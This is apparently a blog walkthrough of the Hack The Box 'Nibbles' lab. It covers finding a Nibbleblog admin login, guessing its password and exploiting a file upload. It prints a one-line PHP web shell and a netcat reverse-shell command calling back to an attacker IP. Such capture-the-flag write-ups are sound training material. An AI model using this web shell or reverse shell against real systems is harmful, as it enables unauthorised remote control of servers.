# :electric_plug: Hack The Box : Nibbles Step-by-Step Walkthrough.

---

Got some interesting directories admin.php,README,content.

### /README

It reveals the version of the nibbleblog.

### /content

It gives us an username at /private/users.xml.

### /admin.php : (admin:nibbles)

It’s an login page of the admin.

Since there is an login blacklisting inclusion we need to manually guess the password of the admin. Use the machine name as the password we’ll get access into the admin page. Since it is an easy box try to manually exploit the vulnerability.

## Get Raja’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Two ways to exploit

- Using metasploit.

- Manual.

### 1.Using metasploit

if you want to use metasploit u can use it since we know version,username,password of the admin panel.

It only requires username,password and the application url.

>

Note: it’ll only help us to get shell as a user.

### 2. Manual

We can upload files to the application since we are admin.

I used My image plugin to upload the file.

```
<?php passthru($_REQUEST['cmd']); ?>
```

saved this into a file shell.php and uploaded it.

>

Note: we are uploading our own custom file into the my_image plugin,my_image helps us to execute commands in the server.

## Getting shell

Intercept the request and change to request method to post.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 9001 >/tmp/f
```

Used this command to get a reverse shell.

---
